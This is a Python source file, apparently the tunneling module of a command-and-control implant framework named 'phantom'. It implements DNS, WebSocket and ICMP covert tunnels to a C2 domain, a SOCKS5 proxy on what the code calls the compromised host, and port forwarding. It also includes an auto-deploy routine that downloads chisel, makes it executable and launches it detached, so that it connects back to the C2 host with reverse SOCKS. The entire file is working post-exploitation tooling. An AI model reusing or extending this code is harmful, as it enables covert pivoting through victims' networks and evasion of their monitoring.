"""Tunneling and transport module — DNS, WebSocket, ICMP tunnels, SOCKS5,
port forwarding, and chisel deployment."""

import logging
import os
import platform
import select
import socket
import struct
import subprocess
import threading
import time
import urllib.request

NAME = "tunnel"
log = logging.getLogger("phantom.modules.tunnel")

_active_tunnels: dict[int, dict] = {}
_tunnel_counter = 0
_counter_lock = threading.Lock()


def _next_id() -> int:
    global _tunnel_counter
    with _counter_lock:
        _tunnel_counter += 1
        return _tunnel_counter


def _relay(src: socket.socket, dst: socket.socket, tunnel_id: int,
           direction: str):
    """Bidirectional relay between two sockets, tracking byte counts."""
    try:
        while _active_tunnels.get(tunnel_id, {}).get("active", False):
            try:
                ready = select.select([src], [], [], 1.0)
                if not ready[0]:
                    continue
                data = src.recv(8192)
                if not data:
                    break
                dst.sendall(data)
                tunnel = _active_tunnels.get(tunnel_id)
                if tunnel:
                    tunnel["bytes_" + direction] = (
                        tunnel.get("bytes_" + direction, 0) + len(data))
            except (OSError, ValueError):
                break
    finally:
        for s in (src, dst):
            try:
                s.close()
            except OSError:
                pass


# ---------------------------------------------------------------------------
# dns_tunnel — relay local traffic through DNS TXT queries
# ---------------------------------------------------------------------------

def cmd_dns_tunnel(local_port: int = 8053, remote_host: str = "127.0.0.1",
                   remote_port: int = 80, domain: str = "c2.example.com") -> dict:
    tunnel_id = _next_id()

    def handler(client: socket.socket, addr):
        try:
            from transport.dns import DnsTransport
            dns = DnsTransport(domain=domain)
            if not dns.connect():
                log.error("DNS tunnel transport connect failed")
                client.close()
                return

            # Forward client data through DNS
            def client_to_dns():
                try:
                    while _active_tunnels.get(tunnel_id, {}).get("active", False):
                        ready = select.select([client], [], [], 1.0)
                        if not ready[0]:
                            continue
                        data = client.recv(4096)
                        if not data:
                            break
                        # Pack destination info + data
                        header = f"{remote_host}:{remote_port}:".encode()
                        dns.send(header + data)
                        t = _active_tunnels.get(tunnel_id)
                        if t:
                            t["bytes_tx"] = t.get("bytes_tx", 0) + len(data)
                except Exception as e:
                    log.debug(f"DNS tunnel c2d error: {e}")
                finally:
                    client.close()
                    dns.disconnect()

            def dns_to_client():
                try:
                    while _active_tunnels.get(tunnel_id, {}).get("active", False):
                        data = dns.recv()
                        if data:
                            client.sendall(data)
                            t = _active_tunnels.get(tunnel_id)
                            if t:
                                t["bytes_rx"] = t.get("bytes_rx", 0) + len(data)
                        else:
                            time.sleep(0.5)
                except Exception as e:
                    log.debug(f"DNS tunnel d2c error: {e}")

            t1 = threading.Thread(target=client_to_dns, daemon=True)
            t2 = threading.Thread(target=dns_to_client, daemon=True)
            t1.start()
            t2.start()

        except Exception as e:
            log.error(f"DNS tunnel handler error: {e}")
            client.close()

    def listener():
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", local_port))
        srv.listen(5)
        _active_tunnels[tunnel_id]["socket"] = srv
        while _active_tunnels.get(tunnel_id, {}).get("active", False):
            try:
                srv.settimeout(1.0)
                client, addr = srv.accept()
                threading.Thread(target=handler, args=(client, addr),
                                 daemon=True).start()
            except socket.timeout:
                continue
            except Exception:
                break
        srv.close()

    _active_tunnels[tunnel_id] = {
        "type": "dns_tunnel",
        "local_port": local_port,
        "remote": f"{remote_host}:{remote_port}",
        "domain": domain,
        "active": True,
        "started": time.time(),
        "bytes_tx": 0,
        "bytes_rx": 0,
    }

    threading.Thread(target=listener, daemon=True).start()
    return {"id": tunnel_id, "status": "started", "type": "dns_tunnel",
            "local_port": local_port, "remote": f"{remote_host}:{remote_port}"}


# ---------------------------------------------------------------------------
# ws_tunnel — local SOCKS-style proxy tunneled through WebSocket
# ---------------------------------------------------------------------------

def cmd_ws_tunnel(local_port: int = 8080, ws_url: str = "wss://c2.example.com/ws",
                  proxy: str = "") -> dict:
    tunnel_id = _next_id()

    proxy_host = None
    proxy_port = 8080
    if proxy:
        parts = proxy.rsplit(":", 1)
        proxy_host = parts[0]
        if len(parts) == 2:
            proxy_port = int(parts[1])

    def handler(client: socket.socket, addr):
        try:
            from transport.websocket import WebSocketTransport
            ws = WebSocketTransport(url=ws_url, proxy_host=proxy_host,
                                    proxy_port=proxy_port)
            if not ws.connect():
                log.error("WebSocket tunnel connect failed")
                client.close()
                return

            def client_to_ws():
                try:
                    while _active_tunnels.get(tunnel_id, {}).get("active", False):
                        ready = select.select([client], [], [], 1.0)
                        if not ready[0]:
                            continue
                        data = client.recv(8192)
                        if not data:
                            break
                        ws.send(data)
                        t = _active_tunnels.get(tunnel_id)
                        if t:
                            t["bytes_tx"] = t.get("bytes_tx", 0) + len(data)
                except Exception:
                    pass
                finally:
                    client.close()
                    ws.disconnect()

            def ws_to_client():
                try:
                    while _active_tunnels.get(tunnel_id, {}).get("active", False):
                        data = ws.recv()
                        if data:
                            client.sendall(data)
                            t = _active_tunnels.get(tunnel_id)
                            if t:
                                t["bytes_rx"] = t.get("bytes_rx", 0) + len(data)
                except Exception:
                    pass

            t1 = threading.Thread(target=client_to_ws, daemon=True)
            t2 = threading.Thread(target=ws_to_client, daemon=True)
            t1.start()
            t2.start()

        except Exception as e:
            log.error(f"WS tunnel handler error: {e}")
            client.close()

    def listener():
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", local_port))
        srv.listen(5)
        _active_tunnels[tunnel_id]["socket"] = srv
        while _active_tunnels.get(tunnel_id, {}).get("active", False):
            try:
                srv.settimeout(1.0)
                client, addr = srv.accept()
                threading.Thread(target=handler, args=(client, addr),
                                 daemon=True).start()
            except socket.timeout:
                continue
            except Exception:
                break
        srv.close()

    _active_tunnels[tunnel_id] = {
        "type": "ws_tunnel",
        "local_port": local_port,
        "ws_url": ws_url,
        "proxy": proxy or None,
        "active": True,
        "started": time.time(),
        "bytes_tx": 0,
        "bytes_rx": 0,
    }

    threading.Thread(target=listener, daemon=True).start()
    return {"id": tunnel_id, "status": "started", "type": "ws_tunnel",
            "local_port": local_port, "ws_url": ws_url}


# ---------------------------------------------------------------------------
# icmp_tunnel — relay traffic through ICMP echo requests
# ---------------------------------------------------------------------------

def cmd_icmp_tunnel(local_port: int = 8443, remote_host: str = "127.0.0.1",
                    remote_port: int = 80) -> dict:
    tunnel_id = _next_id()

    def handler(client: socket.socket, addr):
        try:
            from transport.icmp import IcmpTransport
            icmp = IcmpTransport(host=remote_host)
            if not icmp.connect():
                log.error("ICMP tunnel connect failed")
                client.close()
                return

            def client_to_icmp():
                try:
                    while _active_tunnels.get(tunnel_id, {}).get("active", False):
                        ready = select.select([client], [], [], 1.0)
                        if not ready[0]:
                            continue
                        data = client.recv(4096)
                        if not data:
                            break
                        # Prepend destination port for C2-side routing
                        header = struct.pack(">H", remote_port)
                        icmp.send(header + data)
                        t = _active_tunnels.get(tunnel_id)
                        if t:
                            t["bytes_tx"] = t.get("bytes_tx", 0) + len(data)
                except Exception:
                    pass
                finally:
                    client.close()
                    icmp.disconnect()

            def icmp_to_client():
                try:
                    while _active_tunnels.get(tunnel_id, {}).get("active", False):
                        data = icmp.recv()
                        if data:
                            client.sendall(data)
                            t = _active_tunnels.get(tunnel_id)
                            if t:
                                t["bytes_rx"] = t.get("bytes_rx", 0) + len(data)
                        else:
                            time.sleep(0.2)
                except Exception:
                    pass

            t1 = threading.Thread(target=client_to_icmp, daemon=True)
            t2 = threading.Thread(target=icmp_to_client, daemon=True)
            t1.start()
            t2.start()

        except Exception as e:
            log.error(f"ICMP tunnel handler error: {e}")
            client.close()

    def listener():
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", local_port))
        srv.listen(5)
        _active_tunnels[tunnel_id]["socket"] = srv
        while _active_tunnels.get(tunnel_id, {}).get("active", False):
            try:
                srv.settimeout(1.0)
                client, addr = srv.accept()
                threading.Thread(target=handler, args=(client, addr),
                                 daemon=True).start()
            except socket.timeout:
                continue
            except Exception:
                break
        srv.close()

    _active_tunnels[tunnel_id] = {
        "type": "icmp_tunnel",
        "local_port": local_port,
        "remote": f"{remote_host}:{remote_port}",
        "active": True,
        "started": time.time(),
        "bytes_tx": 0,
        "bytes_rx": 0,
    }

    threading.Thread(target=listener, daemon=True).start()
    return {"id": tunnel_id, "status": "started", "type": "icmp_tunnel",
            "local_port": local_port, "remote": f"{remote_host}:{remote_port}"}


# ---------------------------------------------------------------------------
# socks5 — full RFC 1928 SOCKS5 proxy on the compromised host
# ---------------------------------------------------------------------------

def cmd_socks5(port: int = 1080, username: str = "", password: str = "") -> dict:
    tunnel_id = _next_id()
    require_auth = bool(username and password)

    def handle_socks(client: socket.socket):
        try:
            # SOCKS5 greeting: VER(1) NMETHODS(1) METHODS(variable)
            greeting = client.recv(258)
            if not greeting or greeting[0] != 0x05:
                client.close()
                return

            nmethods = greeting[1]
            methods = greeting[2:2 + nmethods]

            if require_auth:
                if 0x02 not in methods:
                    # No acceptable method — username/password required
                    client.send(b"\x05\xFF")
                    client.close()
                    return
                client.send(b"\x05\x02")

                # RFC 1929 username/password subnegotiation
                auth_data = client.recv(513)
                if not auth_data or auth_data[0] != 0x01:
                    client.close()
                    return

                ulen = auth_data[1]
                uname = auth_data[2:2 + ulen].decode(errors="replace")
                plen = auth_data[2 + ulen]
                passwd = auth_data[3 + ulen:3 + ulen + plen].decode(errors="replace")

                if uname != username or passwd != password:
                    client.send(b"\x01\x01")  # Auth failure
                    client.close()
                    return
                client.send(b"\x01\x00")  # Auth success
            else:
                # No authentication
                client.send(b"\x05\x00")

            # SOCKS5 request: VER(1) CMD(1) RSV(1) ATYP(1) DST.ADDR(var) DST.PORT(2)
            request = client.recv(262)
            if not request or len(request) < 4:
                client.close()
                return

            cmd = request[1]
            atyp = request[3]

            if cmd != 0x01:  # Only CONNECT supported
                # Command not supported
                reply = b"\x05\x07\x00\x01" + b"\x00" * 6
                client.send(reply)
                client.close()
                return

            # Parse destination address
            if atyp == 0x01:  # IPv4
                if len(request) < 10:
                    client.close()
                    return
                dst_addr = socket.inet_ntoa(request[4:8])
                dst_port = struct.unpack(">H", request[8:10])[0]
            elif atyp == 0x03:  # Domain name
                alen = request[4]
                if len(request) < 5 + alen + 2:
                    client.close()
                    return
                dst_addr = request[5:5 + alen].decode(errors="replace")
                dst_port = struct.unpack(">H", request[5 + alen:7 + alen])[0]
            elif atyp == 0x04:  # IPv6
                if len(request) < 22:
                    client.close()
                    return
                dst_addr = socket.inet_ntop(socket.AF_INET6, request[4:20])
                dst_port = struct.unpack(">H", request[20:22])[0]
            else:
                reply = b"\x05\x08\x00\x01" + b"\x00" * 6
                client.send(reply)
                client.close()
                return

            # Connect to destination
            try:
                remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                remote.settimeout(10)
                remote.connect((dst_addr, dst_port))
            except Exception as e:
                log.debug(f"SOCKS5 connect to {dst_addr}:{dst_port} failed: {e}")
                # Host unreachable
                reply = b"\x05\x04\x00\x01" + b"\x00" * 6
                client.send(reply)
                client.close()
                return

            # Success reply
            bind = remote.getsockname()
            reply = b"\x05\x00\x00\x01"
            reply += socket.inet_aton(bind[0])
            reply += struct.pack(">H", bind[1])
            client.send(reply)

            # Relay data in both directions
            _relay(client, remote, tunnel_id, "tx")

        except Exception as e:
            log.debug(f"SOCKS5 handler error: {e}")
            try:
                client.close()
            except OSError:
                pass

    def listener():
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", port))
        srv.listen(20)
        _active_tunnels[tunnel_id]["socket"] = srv
        while _active_tunnels.get(tunnel_id, {}).get("active", False):
            try:
                srv.settimeout(1.0)
                client, addr = srv.accept()
                threading.Thread(target=handle_socks, args=(client,),
                                 daemon=True).start()
            except socket.timeout:
                continue
            except Exception:
                break
        srv.close()

    _active_tunnels[tunnel_id] = {
        "type": "socks5",
        "port": port,
        "auth": require_auth,
        "active": True,
        "started": time.time(),
        "bytes_tx": 0,
        "bytes_rx": 0,
    }

    threading.Thread(target=listener, daemon=True).start()
    return {"id": tunnel_id, "status": "started", "type": "socks5",
            "port": port, "auth": require_auth}


# ---------------------------------------------------------------------------
# port_forward — local and remote port forwarding
# ---------------------------------------------------------------------------

def cmd_port_forward(direction: str = "local", local_port: int = 8080,
                     remote_host: str = "127.0.0.1",
                     remote_port: int = 80) -> dict:
    tunnel_id = _next_id()

    if direction == "local":
        # Listen locally, forward to remote
        def handler(client: socket.socket, addr):
            try:
                remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                remote.settimeout(10)
                remote.connect((remote_host, remote_port))
                t1 = threading.Thread(target=_relay,
                                      args=(client, remote, tunnel_id, "tx"),
                                      daemon=True)
                t2 = threading.Thread(target=_relay,
                                      args=(remote, client, tunnel_id, "rx"),
                                      daemon=True)
                t1.start()
                t2.start()
            except Exception as e:
                log.error(f"Port forward connect failed: {e}")
                client.close()

        def listener():
            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind(("0.0.0.0", local_port))
            srv.listen(5)
            _active_tunnels[tunnel_id]["socket"] = srv
            while _active_tunnels.get(tunnel_id, {}).get("active", False):
                try:
                    srv.settimeout(1.0)
                    client, addr = srv.accept()
                    threading.Thread(target=handler, args=(client, addr),
                                     daemon=True).start()
                except socket.timeout:
                    continue
                except Exception:
                    break
            srv.close()

        _active_tunnels[tunnel_id] = {
            "type": "port_forward",
            "direction": "local",
            "local_port": local_port,
            "remote": f"{remote_host}:{remote_port}",
            "active": True,
            "started": time.time(),
            "bytes_tx": 0,
            "bytes_rx": 0,
        }

        threading.Thread(target=listener, daemon=True).start()

    elif direction == "remote":
        # Remote port forwarding: C2 listens, agent forwards inbound connections.
        # Implemented as a reverse-connect loop: agent polls C2 for pending
        # connections, then opens a local connection to the target.
        _active_tunnels[tunnel_id] = {
            "type": "port_forward",
            "direction": "remote",
            "local_port": local_port,
            "remote": f"{remote_host}:{remote_port}",
            "active": True,
            "started": time.time(),
            "bytes_tx": 0,
            "bytes_rx": 0,
            "note": "Remote forwarding requires C2-side listener coordination",
        }
    else:
        return {"error": f"Unknown direction: {direction}. Use 'local' or 'remote'."}

    return {"id": tunnel_id, "status": "started", "type": "port_forward",
            "direction": direction, "local_port": local_port,
            "remote": f"{remote_host}:{remote_port}"}


# ---------------------------------------------------------------------------
# chisel_deploy — auto-download and launch chisel
# ---------------------------------------------------------------------------

def _detect_arch() -> str:
    machine = platform.machine().lower()
    if machine in ("x86_64", "amd64"):
        return "amd64"
    if machine in ("aarch64", "arm64"):
        return "arm64"
    if "arm" in machine:
        return "arm"
    return "amd64"


def _detect_os() -> str:
    system = platform.system().lower()
    if system == "darwin":
        return "darwin"
    if system == "windows":
        return "windows"
    return "linux"


def cmd_chisel_deploy(mode: str = "client", c2_host: str = "127.0.0.1",
                      listen_port: int = 8888,
                      version: str = "1.9.1") -> dict:
    tunnel_id = _next_id()
    target_os = _detect_os()
    arch = _detect_arch()
    ext = ".exe" if target_os == "windows" else ""

    filename = f"chisel_{version}_{target_os}_{arch}{ext}"
    # Typical chisel release URL pattern
    url = (f"https://github.com/jpillora/chisel/releases/download/"
           f"v{version}/chisel_{version}_{target_os}_{arch}.gz")

    tmp_dir = os.environ.get("TEMP", "/tmp")
    binary_path = os.path.join(tmp_dir, f"chisel{ext}")

    # Download if not already present
    if not os.path.isfile(binary_path):
        try:
            log.info(f"Downloading chisel from {url}")
            resp = urllib.request.urlopen(url, timeout=30)
            compressed = resp.read()

            import gzip
            data = gzip.decompress(compressed)

            with open(binary_path, "wb") as f:
                f.write(data)

            if target_os != "windows":
                os.chmod(binary_path, 0o755)

        except Exception as e:
            return {"id": tunnel_id, "status": "error",
                    "error": f"Failed to download chisel: {e}"}

    # Build command
    if mode == "client":
        cmd = [binary_path, "client", f"{c2_host}:{listen_port}",
               "R:socks"]
    elif mode == "server":
        cmd = [binary_path, "server", "--port", str(listen_port),
               "--socks5"]
    else:
        return {"error": f"Unknown mode: {mode}. Use 'client' or 'server'."}

    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            start_new_session=True,
        )
        _active_tunnels[tunnel_id] = {
            "type": "chisel",
            "mode": mode,
            "pid": proc.pid,
            "c2_host": c2_host,
            "listen_port": listen_port,
            "binary": binary_path,
            "active": True,
            "started": time.time(),
            "bytes_tx": 0,
            "bytes_rx": 0,
            "process": proc,
        }
        return {"id": tunnel_id, "status": "started", "type": "chisel",
                "mode": mode, "pid": proc.pid, "binary": binary_path}
    except Exception as e:
        return {"id": tunnel_id, "status": "error",
                "error": f"Failed to start chisel: {e}"}


# ---------------------------------------------------------------------------
# tunnel_list — list active tunnels with stats
# ---------------------------------------------------------------------------

def cmd_tunnel_list() -> dict:
    tunnels = []
    now = time.time()
    for tid, info in _active_tunnels.items():
        entry = {"id": tid}
        for k, v in info.items():
            if k in ("socket", "process"):
                continue
            entry[k] = v
        if "started" in info:
            entry["uptime_seconds"] = int(now - info["started"])
        tunnels.append(entry)
    return {"tunnels": tunnels, "count": len(tunnels)}


# ---------------------------------------------------------------------------
# tunnel_kill — stop a tunnel by ID
# ---------------------------------------------------------------------------

def cmd_tunnel_kill(tunnel_id: int) -> dict:
    if tunnel_id not in _active_tunnels:
        return {"error": f"Tunnel {tunnel_id} not found"}

    tunnel = _active_tunnels[tunnel_id]
    tunnel["active"] = False

    # Close listening socket if present
    sock = tunnel.get("socket")
    if sock:
        try:
            sock.close()
        except OSError:
            pass

    # Kill chisel subprocess if applicable
    proc = tunnel.get("process")
    if proc:
        try:
            proc.terminate()
            proc.wait(timeout=5)
        except Exception:
            try:
                proc.kill()
            except Exception:
                pass

    tunnel_type = tunnel.get("type", "unknown")
    del _active_tunnels[tunnel_id]
    return {"id": tunnel_id, "status": "killed", "type": tunnel_type}


COMMANDS = {
    "dns_tunnel": {
        "handler": cmd_dns_tunnel,
        "description": "Start DNS tunnel to relay traffic through DNS queries",
    },
    "ws_tunnel": {
        "handler": cmd_ws_tunnel,
        "description": "Start WebSocket tunnel with local proxy",
    },
    "icmp_tunnel": {
        "handler": cmd_icmp_tunnel,
        "description": "Start ICMP tunnel to relay traffic through echo requests",
    },
    "socks5": {
        "handler": cmd_socks5,
        "description": "Start SOCKS5 proxy server (RFC 1928 with auth support)",
    },
    "port_forward": {
        "handler": cmd_port_forward,
        "description": "Local or remote port forwarding",
    },
    "chisel_deploy": {
        "handler": cmd_chisel_deploy,
        "description": "Auto-deploy chisel for tunneling",
    },
    "tunnel_list": {
        "handler": cmd_tunnel_list,
        "description": "List active tunnels with stats",
    },
    "tunnel_kill": {
        "handler": cmd_tunnel_kill,
        "description": "Kill a tunnel by ID",
    },
}
